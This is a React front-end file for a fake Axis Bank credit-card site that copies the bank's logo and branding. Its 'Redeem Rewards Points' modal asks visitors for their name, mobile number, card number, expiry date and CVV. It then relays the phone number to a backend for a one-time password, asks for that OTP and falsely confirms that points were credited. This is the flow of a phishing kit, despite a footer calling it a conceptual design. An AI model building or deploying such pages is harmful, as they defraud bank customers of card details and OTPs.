import { useEffect, useState } from "react"
import "./App.css"

const App = () => {
  const [currentSlide, setCurrentSlide] = useState(0)
  const [showRewardModal, setShowRewardModal] = useState(false)
  const [otpStep, setOtpStep] = useState(1)
  const [phoneNumber, setPhoneNumber] = useState("")
  const [otp, setOtp] = useState("")
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [success, setSuccess] = useState(false)
  const [toast, setToast] = useState(null)

  // NEW STATES
  const [menuOpen, setMenuOpen] = useState(false)
  const [showLoginModal, setShowLoginModal] = useState(false)
  const [registrationNumber, setRegistrationNumber] = useState("")

  // Hero slides
  const slides = [
    { title: "ACE Credit Card", subtitle: "ZERO JOINING FEE", benefit: "Up to ₹18,000 Benefits", image: "1.jpg" },
    { title: "Premium Card", subtitle: "EXCLUSIVE REWARDS", benefit: "Up to ₹25,000 Benefits", image: "2.jpg" },
    { title: "Travel Card", subtitle: "TRAVEL BENEFITS", benefit: "Up to ₹30,000 Benefits", image: "3.jpg" },
    { title: "Shopping Card", subtitle: "CASHBACK OFFERS", benefit: "Up to ₹20,000 Benefits", image: "4.jpg" },
  ]

  // Auto-slide
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % slides.length)
    }, 3000)
    return () => clearInterval(interval)
  }, [slides.length])

  // Toast
  const showToast = (msg, type = "info") => {
    setToast({ msg, type })
    setTimeout(() => setToast(null), 3000)
  }

  // Send OTP
  const sendOTP = async () => {
    if (!phoneNumber || phoneNumber.length !== 10) {
      setError("Please enter a valid 10-digit phone number")
      return
    }
    setLoading(true)
    setError("")
    try {
      const response = await fetch("/api/send-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phoneNumber }),
      })
      const data = await response.json()
      if (response.ok) {
        showToast("OTP sent successfully ✅", "success")
        setOtpStep(3)
      } else {
        showToast(data.message || "Failed to send OTP ❌", "error")
        setError(data.message || "Failed to send OTP")
      }
    } catch (err) {
      console.error("Send OTP error:", err)
      showToast("Network error ❌", "error")
      setError("Network error. Please try again.")
    } finally {
      setLoading(false)
    }
  }

  // Verify OTP
  const verifyOTP = async () => {
    if (!otp || otp.length !== 6) {
      setError("Please enter a valid 6-digit OTP")
      return
    }
    setLoading(true)
    setError("")
    try {
      const response = await fetch("/api/verify-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phoneNumber, otp }),
      })
      const data = await response.json()
      if (response.ok) {
        showToast("OTP verified 🎉", "success")
        setSuccess(true)
        setOtpStep(3)
      } else {
        showToast(data.message || "Invalid OTP ❌", "error")
        setError(data.message || "Invalid OTP")
      }
    } catch (err) {
      console.error("Verify OTP error:", err)
      showToast("Network error ❌", "error")
      setError("Network error. Please try again.")
    } finally {
      setLoading(false)
    }
  }

  // Reset Reward modal
  const resetModal = () => {
    setShowRewardModal(false)
    setOtpStep(1)
    setPhoneNumber("")
    setOtp("")
    setError("")
    setSuccess(false)
  }

  return (
    <div className="app">
      {toast && <div className={`toast ${toast.type}`}>{toast.msg}</div>}

      {/* Header */}
      <header className="header">
        <div className="header-content">
          <div className="logo">
            <img src="/logo.png" alt="Axis Bank" />
            {/* <span>AXIS BANK</span> */}
          </div>
          {!menuOpen ? (
            <button className="menu-btn" onClick={() => setMenuOpen(true)}>☰</button>
          ) : (
            <button className="menu-btn" onClick={() => setMenuOpen(false)}>×</button>
          )}
        </div>
      </header>

      {/* Hamburger Menu */}
      {menuOpen && (
        <div className="menu-overlay" onClick={() => setMenuOpen(false)}>
          <div className="menu" onClick={(e) => e.stopPropagation()}>
            <div className="menu-header">
              <img src="/logo.png" alt="Axis Bank" />
              <button className="close-btn" onClick={() => setMenuOpen(false)}>×</button>
            </div>
            <ul className="menu-list">
              {["Explore Products", "Grab Deals", "Bank Smart", "Credit Card", "Benefits", "Personal", "Business", "About Us", "Support"].map((item, i) => (
                <li key={i} onClick={() => setMenuOpen(false)}>{item}</li>
              ))}
            </ul>
            <div className="menu-footer">
              <span className="lang-switch">Switch to हिन्दी</span>
              <button className="login-btn" onClick={() => { setShowLoginModal(true); setMenuOpen(false) }}>LOGIN</button>
            </div>
          </div>
        </div>
      )}


      {/* Hero slider */}
     {/* Hero Section */}
<section className="hero-section">
  <div className="hero-slider">
    {slides.map((slide, index) => (
      <div key={index} className={`hero-slide ${index === currentSlide ? "active" : ""}`}>
        <img src={slide.image} alt={slide.title} className="hero-image" />
      </div>
    ))}
  </div>

  {/* Apply Now Button */}
  <div className="hero-btn-wrapper">
    <button className="hero-apply-btn">Apply Now</button>
  </div>
</section>


      {/* Intro */}
      <main className="main-content">
        <section className="intro-section">
          <h1>Apply for Credit Card Online - Get Instant Approval</h1>
          <p>
            Credit Cards serve as convenient financial tools, providing you with the ease of managing your expenses
            seamlessly. Opting for an Axis Bank Credit Card opens doors to a world of convenience.
          </p>
        </section>

        {/* Rewards */}
        <section className="rewards-section">
          <div className="reward-card">
            <div className="reward-icon">$</div>
            <h3>REWARD POINTS</h3>
            <p>Claiming reward points is easy with Axis Bank. Once customers have accumulated 500 points they can redeem.</p>
            <button className="reward-btn" onClick={() => setShowRewardModal(true)}>Apply Now</button>
          </div>
        </section>

        {/* Services */}
        <section className="services-grid">
          <div className="service-card"><div className="service-icon">✓</div><h4>CARD ACTIVATION</h4><p>Need to activate your new credit card? Follow our simple steps and start using your card today.</p><button className="service-btn">Apply Now</button></div>
          <div className="service-card"><div className="service-icon">🔒</div><h4>CARD BLOCK</h4><p>Block your lost or stolen card immediately to prevent unauthorized transactions.</p><button className="service-btn">Apply Now</button></div>
          <div className="service-card"><div className="service-icon">🔗</div><h4>LINK CARD</h4><p>Link your Axis Bank credit card to UPI and enjoy seamless digital payments.</p><button className="service-btn">Apply Now</button></div>
          <div className="service-card"><div className="service-icon">🛡️</div><h4>PROTECTION PLAN</h4><p>Secure your transactions with Axis Bank's Card Protection Plan (CPP).</p><button className="service-btn">Apply Now</button></div>
        </section>

        {/* Offers Section */}
        <section className="offers-section">
          <div className="offer-card">
            <div className="offer-subtitle">EXCLUSIVE OFFERS</div>
            <h2>Get Your Dream Credit Card Today!</h2>
            <button className="offer-btn">Choose Your Card</button>
          </div>
          <div className="offer-card light-pink">
            <h2>Special Offers</h2>
          </div>
          <div className="offer-card light-blue">
            <h2>Shopping Deals</h2>
          </div>
          <div className="offer-card">
            <h2>Shop More, Save More</h2>
            <p>Enjoy amazing discounts and cashback on your favorite brands.</p>
            <button className="offer-btn">Explore Offers</button>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="footer">
        <div className="footer-content">
          <div className="footer-section"><h4>Credit Cards</h4><ul><li>Travel Cards</li><li>Shopping Cards</li><li>Fuel Cards</li><li>Premium Cards</li></ul></div>
          <div className="footer-section"><h4>Useful Links</h4><ul><li>Training Centre</li><li>Home Buyer's Guide</li><li>FAQs</li><li>Blogs</li></ul></div>
          <div className="footer-section"><h4>Contact Us</h4><ul><li>Service Request</li><li>Helpline Number</li><li>Locate Us</li><li>Grievance Redressal</li></ul></div>
          <div className="footer-section"><h4>Card Services</h4><ul><li>Card Activation</li><li>Block Your Card</li><li>Generate PIN</li><li>Application Status</li></ul></div>
        </div>
        <div className="footer-bottom">
          <p>© 2025 Axis Bank Online. This is a conceptual design. All rights reserved.</p>
        </div>
      </footer>

      {/* Reward Modal */}
      {showRewardModal && (
        <div className="modal-overlay" onClick={resetModal}>
          <div className="modal" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <h3>Redeem Rewards Points</h3>
              <button className="close-btn" onClick={resetModal}>×</button>
            </div>
            <div className="modal-body">
              {/* Step indicators */}
              <div className="step-indicators">
                <div className={`step ${otpStep >= 1 ? "active" : ""}`}><span className="step-number">1</span><span className="step-label">Personal Info</span></div>
                <div className={`step ${otpStep >= 2 ? "active" : ""}`}><span className="step-number">2</span><span className="step-label">Card Details</span></div>
                <div className={`step ${otpStep >= 3 ? "active" : ""}`}><span className="step-number">3</span><span className="step-label">Verification</span></div>
              </div>

              {error && <div className="error-message">{error}</div>}

              {/* Step 1 */}
              {otpStep === 1 && (
                <div className="form-step">
                  <h4>Personal Information</h4>
                  <input type="text" placeholder="Full Name (as on card)" className="form-input" />
                  <input type="tel" placeholder="Registered Mobile Number" value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value)} maxLength="10" className="form-input" />
                  <input type="text" placeholder="Card Limit (optional)" className="form-input" />
                  <button className="form-btn" onClick={() => setOtpStep(2)}>Next</button>
                </div>
              )}

              {/* Step 2 */}
              {otpStep === 2 && (
                <div className="form-step">
                  <h4>Credit Card Details</h4>
                  <input type="text" placeholder="Credit Card Number" className="form-input" />
                  <input type="text" placeholder="Expiry Date (MM/YY)" className="form-input" />
                  <input type="password" placeholder="CVV" className="form-input" />
                  <button className="form-btn" onClick={sendOTP} disabled={loading}>{loading ? "Submitting..." : "Submit"}</button>
                  <button className="form-btn secondary" onClick={() => setOtpStep(1)}>Back</button>
                </div>
              )}

              {/* Step 3 */}
              {otpStep === 3 && !success && (
                <div className="form-step">
                  <h4>One Time Password</h4>
                  <p>We’ve sent a 6-digit OTP to {phoneNumber}</p>
                  <input type="text" placeholder="Enter 6-digit OTP" value={otp} onChange={(e) => setOtp(e.target.value)} maxLength="6" className="form-input" />
                  <button className="form-btn" onClick={verifyOTP} disabled={loading}>{loading ? "Verifying..." : "Verify"}</button>
                  <button className="form-btn secondary" onClick={sendOTP}>Resend OTP</button>
                </div>
              )}

              {/* Success */}
              {success && (
                <div className="form-step success">
                  <div className="success-icon">✓</div>
                  <h4>Reward Points Claimed Successfully!</h4>
                  <p>Your reward points have been credited.</p>
                  <button className="form-btn" onClick={resetModal}>Close</button>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Login Modal */}
      {showLoginModal && (
        <div className="modal-overlay" onClick={() => setShowLoginModal(false)}>
          <div className="modal" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <h3>Login</h3>
              <button className="close-btn" onClick={() => setShowLoginModal(false)}>×</button>
            </div>
            <div className="modal-body">
              <div className="form-step">
                <h4>Enter Registered Number</h4>
                <input
                  type="text"
                  placeholder="Registered Number"
                  value={registrationNumber}
                  onChange={(e) => setRegistrationNumber(e.target.value)}
                  className="form-input"
                />
                <button
                  className="form-btn"
                  onClick={() => {
                    setShowLoginModal(false)
                    window.location.href = "/" // redirect home
                  }}
                >
                  Submit
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

export default App
